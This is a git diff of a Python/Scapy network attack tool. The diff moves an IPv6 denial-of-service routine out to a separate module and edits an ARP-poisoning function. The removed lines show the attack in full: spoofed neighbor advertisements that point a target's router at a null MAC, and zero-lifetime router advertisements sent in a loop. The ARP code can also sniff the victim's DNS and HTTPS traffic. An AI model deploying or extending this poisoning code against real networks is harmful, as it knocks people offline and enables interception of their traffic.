@@ -18,6 +18,8 @@ from scapy.layers.inet6 import (
 from utils import config
 from utils.utilities import get_ip
 from utils import utilities
+from modules import ipv6_poison 
+
 stop_event = threading.Event()
 
 
@@ -53,69 +55,6 @@ def restore_arp_tables(target_ip, router_ip, router_mac, target_mac):
         time.sleep(config.HEAL_JITTER)
 
 
-def ipv6_poke():
-    rs_packet = Ether() / IPv6(dst="ff02::2") / ICMPv6ND_RS()
-
-    ping_packet = (
-        Ether(dst="33:33:00:00:00:01") / IPv6(dst="ff02::1") / ICMPv6EchoRequest()
-    )
-
-    utilities.safe_send(rs_packet)
-    utilities.safe_send(ping_packet)
-
-
-def ipv6_poison_service(target_mac):
-
-    #Handles discovery and then switches to the poisoning loop.
-
-    target_v6, router_v6 = None, None
-    ipv6_poke()
-
-    def find_ips(pkt):
-        #To anyone reading this, if you've worked with python long enough 
-        #You know that this "nonlocal" keyword was a fun 20 minutes of me desperately 
-        #Trying to understand why i WAS geting such weird results 
-        nonlocal target_v6, router_v6
-        if IPv6 in pkt:
-            if pkt.haslayer(ICMPv6ND_RA):
-                router_v6 = pkt[IPv6].src
-            if pkt.src == target_mac:
-                target_v6 = pkt[IPv6].src
-
-
-    #Multicast Ping makes all nodes respond
-    print("Discovering IPv6 Link-Local addresses...")
-    sniff(
-        filter="ip6",
-        prn=find_ips,
-        timeout=20,
-        stop_filter=lambda x: target_v6 and router_v6,
-    )
-
-    if not target_v6 or not router_v6:
-        print("IPv6 Discovery Failed. Router/Target are being too quiet!")
-        return
-
-    print(f"IPv6 DOS: Target {target_v6} | Router {router_v6}")
-
-    #Route packets to a nonsense address
-    na_packet = (
-        Ether(dst=target_mac)
-        / IPv6(src=router_v6, dst=target_v6)
-        / ICMPv6ND_NA(tgt=router_v6, R=1, S=1, O=1)
-        / ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00")
-    )
-
-    ra_kill = (
-        Ether(dst="33:33:00:00:00:01")
-        / IPv6(dst="ff02::1")
-        / ICMPv6ND_RA(routerlifetime=0)
-    )
-
-    while not stop_event.is_set():
-        utilities.safe_send(na_packet)
-        utilities.safe_send(ra_kill)
-        time.sleep(0.1)
 
 def start_sniffer_binary():
     import subprocess
@@ -155,7 +94,7 @@ def start_arp_poison(target_ip, target_mac, router_ip, attacker_mac, router_mac,
     threads = []
 
     #Target poisonong
-    address = "00:00:00:00:00:00" if dos else attacker_mac
+    address = "00:00:00:00:00:03" if dos else attacker_mac
     target_thread = threading.Thread(
         target=arp_poison_loop,
         args=(target_ip, router_ip, target_mac, address),
@@ -179,7 +118,7 @@ def start_arp_poison(target_ip, target_mac, router_ip, attacker_mac, router_mac,
         )
         threads.append(ipv6_thread)
 
-    if not dos:
+    else:
         try:
             my_ip = get_ip()
             my_filter = f"ip4 and not host {my_ip} and (udp port 53 or tcp port 443)"
